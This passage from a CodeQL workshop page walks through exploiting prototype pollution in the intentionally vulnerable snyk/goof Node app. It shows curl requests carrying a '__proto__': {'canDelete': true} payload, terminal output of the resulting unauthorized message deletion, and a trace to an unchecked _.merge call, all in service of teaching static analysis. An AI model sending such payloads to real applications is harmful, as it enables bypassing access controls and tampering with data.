docs/codeql/codeql-workshops/javascript/codeql-js-goof-workshop/workshop.html

<div id="outline-container-orgf450473" class="outline-3">
<h3 id="orgf450473"><span class="section-number-3">4.2</span> Exploit the snyk/goof Application</h3>
<div class="outline-text-3" id="text-4-2">
<p>
This is a concise run to exploit the prototype injection of <a href="https://github.com/snyk/goof">snyk/goof</a>.  For a
complete walkthrough, see <a href="#org4721eb6">Appendix E: Complete Setup and Exploit of the
snyk/goof Application</a>.
</p>

<p>
For the workshop we only need to collect vulnerability information; once goof
is running, we try the prototype-pollution exploits:
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">Check exploits</span>
bash
<span style="color: #483d8b;">.</span> ~/local/goof/exploits/prototype-pollution.sh

<span style="color: #b22222;"># </span><span style="color: #b22222;">Try c1 through c4 and exploit:</span>
List messages
        hohn@gh-hohn ~/local/goof/exploits
        0:$ c1
        []

Send some messages
        hohn@gh-hohn ~/local/goof/exploits
        0:$ c2
        {<span style="color: #8b2252;">"ok"</span>:true}
        hohn@gh-hohn ~/local/goof/exploits
        0:$ c2
        {<span style="color: #8b2252;">"ok"</span>:true}

List again
        hohn@gh-hohn ~/local/goof/exploits
        0:$ c1
        [{<span style="color: #8b2252;">"icon"</span>:<span style="color: #8b2252;">"&#128075;"</span>,<span style="color: #8b2252;">"text"</span>:<span style="color: #8b2252;">"Hi!"</span>,<span style="color: #8b2252;">"id"</span>:1,<span style="color: #8b2252;">"timestamp"</span>:1602276330967,<span style="color: #8b2252;">"userName"</span>:<span style="color: #8b2252;">"user"</span>},
         {<span style="color: #8b2252;">"icon"</span>:<span style="color: #8b2252;">"&#128075;"</span>,<span style="color: #8b2252;">"text"</span>:<span style="color: #8b2252;">"Hi!"</span>,<span style="color: #8b2252;">"id"</span>:2,<span style="color: #8b2252;">"timestamp"</span>:1602276331875,<span style="color: #8b2252;">"userName"</span>:<span style="color: #8b2252;">"user"</span>}]

Try to delete
        hohn@gh-hohn ~/local/goof/exploits
        0:$ c4
        {<span style="color: #8b2252;">"ok"</span>:false,<span style="color: #8b2252;">"error"</span>:<span style="color: #8b2252;">"Access denied"</span>}

Use exploit
        hohn@gh-hohn ~/local/goof/exploits
        0:$ c3
        {<span style="color: #8b2252;">"ok"</span>:true}

Try to delete again
        hohn@gh-hohn ~/local/goof/exploits
        130:$ c4
        {<span style="color: #8b2252;">"ok"</span>:true}

Notice message 1 is gone:
        hohn@gh-hohn ~/local/goof/exploits
        0:$ c1
        [{<span style="color: #8b2252;">"icon"</span>:<span style="color: #8b2252;">"&#128075;"</span>,<span style="color: #8b2252;">"text"</span>:<span style="color: #8b2252;">"Hi!"</span>,<span style="color: #8b2252;">"id"</span>:2,<span style="color: #8b2252;">"timestamp"</span>:1602276331875,<span style="color: #8b2252;">"userName"</span>:<span style="color: #8b2252;">"user"</span>},
         {<span style="color: #8b2252;">"icon"</span>:<span style="color: #8b2252;">"&#128075;"</span>,<span style="color: #8b2252;">"text"</span>:<span style="color: #8b2252;">"&#128520;"</span>,<span style="color: #8b2252;">"id"</span>:3,<span style="color: #8b2252;">"timestamp"</span>:1602276340962,<span style="color: #8b2252;">"userName"</span>:<span style="color: #8b2252;">"user"</span>}]
</pre>
</div>


<p>
Now let's examine the exploits and see what happened.  The requests sent are
</p>
<div class="org-src-container">
<pre class="src src-sh">// c2, safe
{
    curl --request PUT <span style="color: #8b2252;">\</span>
      --url <span style="color: #8b2252;">"$GOOF_HOST/chat"</span> <span style="color: #8b2252;">\</span>
      --header <span style="color: #8b2252;">'content-type: application/json'</span> <span style="color: #8b2252;">\</span>
      --data <span style="color: #8b2252;">'{"auth": {"name": "user", "password": "pwd"}, </span>
<span style="color: #8b2252;">               "message": {"text": "Hi!"}}'</span>
}

// c3, the exploit:
{
    curl --request PUT <span style="color: #8b2252;">\</span>
      --url <span style="color: #8b2252;">"$GOOF_HOST/chat"</span> <span style="color: #8b2252;">\</span>
      --header <span style="color: #8b2252;">'content-type: application/json'</span> <span style="color: #8b2252;">\</span>
      --data <span style="color: #8b2252;">'{"auth": {"name": "user", "password": "pwd"}, </span>
<span style="color: #8b2252;">               "message": { "text": "&#128520;", "__proto__": {"canDelete": true}}}'</span>
}

// c4, the delete request
{
    curl --request DELETE <span style="color: #8b2252;">\</span>
      --url <span style="color: #8b2252;">"$GOOF_HOST/chat"</span> <span style="color: #8b2252;">\</span>
      --header <span style="color: #8b2252;">'content-type: application/json'</span> <span style="color: #8b2252;">\</span>
      --data <span style="color: #8b2252;">'{"auth": {"name": "user", "password": "pwd"}, "messageId": 1}'</span>
}
</pre>
</div>

<p>
The first two are PUT requests to the URL <code>$GOOF_HOST/chat</code>, but the json messages differ:
</p>
<div class="org-src-container">
<pre class="src src-javascript"><span style="color: #b22222;">// </span><span style="color: #b22222;">safe</span>
{<span style="color: #8b2252;">"auth"</span>: {<span style="color: #8b2252;">"name"</span>: <span style="color: #8b2252;">"user"</span>, <span style="color: #8b2252;">"password"</span>: <span style="color: #8b2252;">"pwd"</span>}, 
 <span style="color: #8b2252;">"message"</span>: {<span style="color: #8b2252;">"text"</span>: <span style="color: #8b2252;">"Hi!"</span>}}

<span style="color: #b22222;">// </span><span style="color: #b22222;">exploit</span>
{<span style="color: #8b2252;">"auth"</span>: {<span style="color: #8b2252;">"name"</span>: <span style="color: #8b2252;">"user"</span>, <span style="color: #8b2252;">"password"</span>: <span style="color: #8b2252;">"pwd"</span>}, 
 <span style="color: #8b2252;">"message"</span>: { <span style="color: #8b2252;">"text"</span>: <span style="color: #8b2252;">"&#128520;"</span>, <span style="color: #8b2252;">"__proto__"</span>: {<span style="color: #8b2252;">"canDelete"</span>: <span style="color: #008b8b;">true</span>}}}
</pre>
</div>

<p>
The <code>__proto__</code> change allows the delete request to succeed.
</p>
</div>
</div>

<div id="outline-container-orgdc5bf28" class="outline-3">
<h3 id="orgdc5bf28"><span class="section-number-3">4.3</span> Find problems in source code</h3>
<div class="outline-text-3" id="text-4-3">
<p>
Next, we need to see where and why this is causing the problem in the
application.  A short inspection of the source code sheds some light on this
issue. 
</p>

<p>
The app entry point is seen from the startup command:
</p>
<div class="org-src-container">
<pre class="src src-sh">node app.js                     <span style="color: #b22222;"># </span><span style="color: #b22222;">from ~/local/goof/package.json</span>
</pre>
</div>

<p>
For prototype pollution, the c3 send is a http PUT to <code>$GOOF_HOST/chat</code>, with an
invalid <code>message</code>:
</p>
<div class="org-src-container">
<pre class="src src-sh">curl --request PUT <span style="color: #8b2252;">\</span>
  --url <span style="color: #8b2252;">"$GOOF_HOST/chat"</span> <span style="color: #8b2252;">\</span>
  --header <span style="color: #8b2252;">'content-type: application/json'</span> <span style="color: #8b2252;">\</span>
  --data <span style="color: #8b2252;">'{"auth": {"name": "user", "password": "pwd"}, </span>
<span style="color: #8b2252;">           "message": { "text": "&#128520;", "__proto__": {"canDelete": true}}}'</span>
</pre>
</div>

<p>
Inspect the code to track these;  starting from <code>app.js</code>, we see that
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">// </span><span style="color: #b22222;">requests are passed through to routes.chat.add via </span>
app.put(<span style="color: #8b2252;">'/chat'</span>, routes.chat.add);
</pre>
</div>
<p>
and in <code>index.js</code> line 259, <code>routes.chat.add</code>, we see that
</p>
<div class="org-src-container">
<pre class="src src-javascript"><span style="color: #b22222;">// </span><span style="color: #b22222;">requests pass into </span>
exports.chat.add(req, res)
<span style="color: #b22222;">// </span><span style="color: #b22222;">where the the incoming req.body.message directly merged without checks:</span>
_.merge(message, req.body.message, {...})
<span style="color: #b22222;">// </span><span style="color: #b22222;">so message (an {}) now has "__proto__": {"canDelete": true}</span>
</pre>
</div>

<p>
This can be seen using the debugger in VS Code; see <a href="#org93e9eec">Appendix A: Trace the
exploit in the VS Code JS Debugger</a> for details.
</p>

<p>
Key information for the later queries:
</p>
<ul class="org-ul">
<li>the request entry through <code>routes.chat.add()</code></li>
<li>the request use in the <code>_.merge()</code> call</li>
</ul>
</div>
</div>
</div>

<div id="outline-container-orgeed0f82" class="outline-2">
<h2 id="orgeed0f82"><span class="section-number-2">5</span> CodeQL workshop for javascript, Part 2: Write query</h2>
<div class="outline-text-2" id="text-5">
<p>
With the known vulnerability and the information from above, 
</p>
<ul class="org-ul">
<li>the request data enters through <code>routes.chat.add()</code></li>
<li>the request's data is used in the <code>_.merge()</code> call</li>
</ul>
<p>
we can now proceed to write queries to find these problems.
</p>
</div>
